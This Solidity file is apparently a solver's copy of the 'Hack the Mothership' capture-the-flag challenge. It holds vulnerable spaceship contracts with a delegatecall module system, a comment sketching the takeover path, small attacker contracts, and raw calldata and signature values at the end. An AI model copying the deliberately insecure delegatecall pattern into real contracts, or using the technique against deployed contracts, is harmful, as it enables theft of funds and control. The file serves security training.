// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

// hack() - become a leader
// become crew member - captain address zero - become a captain from spaceship - become captain for all spaceships - change module LeadershipModule
// for all spacesips for our custom module that not revert - become leader - hack
/// @title Hack the Mothership
/// @author https://twitter.com/nicobevi_eth
/// @notice A big alien float is near the Earth! You and an anon group of scientists have been working on a global counteroffensive against the invader. Hack the Mothership, save the earth
/// @custom:url https://www.ctfprotocol.com/tracks/eko2022/hack-the-mothership
contract Mothership {
    address public leader;

    SpaceShip[] public fleet;
    mapping(address => SpaceShip) public captainRegisteredShip;

    bool public hacked;

    constructor() {
        leader = msg.sender;

        address[5] memory captains = [
            0x0000000000000000000000000000000000000001,
            0x0000000000000000000000000000000000000002,
            0x0000000000000000000000000000000000000003,
            0x0000000000000000000000000000000000000004,
            0x0000000000000000000000000000000000000005
        ];

        // Adding standard modules
        address cleaningModuleAddress = address(new CleaningModule());
        address refuelModuleAddress = address(new RefuelModule());
        address leadershipModuleAddress = address(new LeadershipModule());

        for (uint8 i = 0; i < 5; i++) {
            SpaceShip _spaceship = new SpaceShip(
                captains[i],
                address(this),
                cleaningModuleAddress,
                refuelModuleAddress,
                leadershipModuleAddress
            );
            fleet.push(_spaceship);
            captainRegisteredShip[captains[i]] = _spaceship;
        }
    }

    function addSpaceShipToFleet(SpaceShip spaceship) external {
        require(leader == msg.sender, "You are not our leader");
        fleet.push(spaceship);
        captainRegisteredShip[spaceship.captain()] = spaceship;
    }

    function _isFleetMember(
        SpaceShip spaceship
    ) private view returns (bool isFleetMember) {
        uint8 len = uint8(fleet.length);
        for (uint8 i; i < len; ++i) {
            if (address(fleet[i]) == address(spaceship)) {
                isFleetMember = true;
                break;
            }
        }
    }

    /**
     * A new captain will be promoted if:
     *     1. Ship is part of the fleet
     *     2. Ship has no captain
     *     3. The new captain is not a captain already
     */
    function assignNewCaptainToShip(address _newCaptain) external {
        SpaceShip spaceship = SpaceShip(msg.sender);

        require(_isFleetMember(spaceship), "You're not part of the fleet");
        require(spaceship.captain() == address(0), "Ship has a captain");
        require(
            address(captainRegisteredShip[_newCaptain]) == address(0),
            "You're a captain already"
        );

        // register ship to captain
        captainRegisteredShip[_newCaptain] = spaceship;

        // Communicate that new captain has been approved to ship
        spaceship.newCaptainPromoted(_newCaptain);
    }

    /**
     * A captain will be assigned as leader of the fleet if:
     *     1. The proposed leader is a spaceship captain
     *     2. All the other ships approve the promotion
     */
    function promoteToLeader(address _leader) external {
        SpaceShip leaderSpaceship = captainRegisteredShip[_leader];

        // should have a registered ship
        require(address(leaderSpaceship) != address(0), "is not a captain");

        // should be approved by other captains
        uint8 len = uint8(fleet.length);
        for (uint8 i; i < len; ++i) {
            SpaceShip spaceship = fleet[i];
            // ignore captain ship
            if (address(spaceship) == address(leaderSpaceship)) {
                continue;
            }
            // should not revert if captain approves the new leader
            LeadershipModule(address(spaceship)).isLeaderApproved(_leader);
        }

        // remove captain from his ship
        delete captainRegisteredShip[_leader];
        leaderSpaceship.newCaptainPromoted(address(0));

        leader = _leader;
    }

    function hack() external {
        require(leader == msg.sender, "You are not our leader");
        hacked = true;
    }

    function fleetLength() external view returns (uint256) {
        return fleet.length;
    }

    /**
     * ...the rest of the code is lost
     */
}

contract SpaceShip {
    address public captain;
    address[] public crew;
    Mothership public mothership;

    mapping(bytes4 => address) public modules;

    constructor(
        address _captain,
        address _mothership,
        address _cleaningModuleAddress,
        address _refuelModuleAddress,
        address _leadershipModuleAddress
    ) {
        captain = _captain;
        mothership = Mothership(_mothership);

        // Adding standard modules
        modules[
            CleaningModule.replaceCleaningCompany.selector
        ] = _cleaningModuleAddress;
        modules[
            RefuelModule.addAlternativeRefuelStationsCodes.selector
        ] = _refuelModuleAddress;
        modules[
            LeadershipModule.isLeaderApproved.selector
        ] = _leadershipModuleAddress;
    }

    function _isCrewMember(
        address member
    ) private view returns (bool isCrewMember) {
        uint256 len = uint256(crew.length);
        for (uint256 i; i < len; ++i) {
            if (crew[i] == member) {
                isCrewMember = true;
                break;
            }
        }
    }

    function newCaptainPromoted(address _captain) external {
        require(msg.sender == address(mothership), "You are not our mother");
        captain = _captain;
    }

    function askForNewCaptain(address _newCaptain) external {
        require(_isCrewMember(msg.sender), "Not part of the crew");
        require(captain == address(0), "We have a captain already");
        mothership.assignNewCaptainToShip(_newCaptain);
    }

    /**
     * This SpaceShip model has an advanced module system
     *     Only the captain can upgrade the ship
     */
    function addModule(bytes4 _moduleSig, address _moduleAddress) external {
        require(msg.sender == captain, "You are not our captain");
        modules[_moduleSig] = _moduleAddress;
    }

    // solhint-disable-next-line no-complex-fallback
    fallback() external {
        bytes4 sig4 = msg.sig;

        address module = modules[sig4];
        require(module != address(0), "invalid module");

        // call the module
        // solhint-disable-next-line avoid-low-level-calls
        (bool success, ) = module.delegatecall(msg.data);
        if (!success) {
            // return response error
            assembly {
                returndatacopy(0, 0, returndatasize())
                revert(0, returndatasize())
            }
        }
    }
}

contract CleaningModule {
    address private cleaningCompany;

    function replaceCleaningCompany(address _cleaningCompany) external {
        cleaningCompany = _cleaningCompany;
    }

    /**
     * ...the rest of the code is lost
     */
}

contract RefuelModule {
    uint256 private mainRefuelStation;
    uint256[] private alternativeRefuelStationsCodes;

    function addAlternativeRefuelStationsCodes(
        uint256 refuelStationCode
    ) external {
        alternativeRefuelStationsCodes.push(refuelStationCode);
    }

    /**
     * ...the rest of the code is lost
     */
}

contract LeadershipModule {
    function isLeaderApproved(address) external pure {
        revert("We don't want a new leader :(");
    }

    /**
     * ...the rest of the code is lost
     */
}

/**
 * ...the rest of the code is lost
 */ // 0x32c2a8b3e580dd1a00000000000000000000000000000000000000000000000000000000
contract LeadershipModule2 {
    function isLeaderApproved(address) external pure {}

    /**
     * ...the rest of the code is lost
     */
}

// 0xc9bAA43fB11C800E7ba373b4Eeb78BBb4A5B1034
contract Captain {
    SpaceShip public spaceShip;

    constructor(SpaceShip _spaceShip) {
        spaceShip = _spaceShip;
    }

    function addModule(bytes4 _moduleSig, address _moduleAddress) external {
        spaceShip.addModule(_moduleSig, _moduleAddress);
    }
}
// 0xd481658a35ccf13b87d46924ca43a5a3054641d077eda2ca67d55f7d38f8763d071f317e88f147f6add00f66f2c76196bc9d9bafbc1228db47b228989a6e094d1c
// hash -- 0xc89efdaa54c0f20c7adf612882df0950f5a951637e0307cdcb4c672f298b8bc6
// v --    0x000000000000000000000000000000000000000000000000000000000000001c
// v --    0x000000000000000000000000000000000000000000000000000000000000001c
//      0x000000000000000000000000AfF1f53D623289851D4a64d4DA2f64D226665F0F
//      0x0000000000000000000000000000000000000000000000000000000000000000
//
// r --    0x74e1e59e60b68571f2028237f658a29506972acf9003ca125329bdc61874ed44
// s --    0x61f454d6b250520d49cd8e205d4743850c858b4eee0842e5e37de71231a8573a
// s --    0xc89efdaa54c0f20c7adf612882df0950f5a951637e0307cdcb4c672f298b8bc6
//

// 0xa432ed96000000000000000000000000AfF1f53D623289851D4a64d4DA2f64D226665F0F
// 0x82cd6f430000000000000000000000000000000000000000000000000000000000000000

// 0xe580dd1a000000000000000000000000AfF1f53D623289851D4a64d4DA2f64D226665F0F
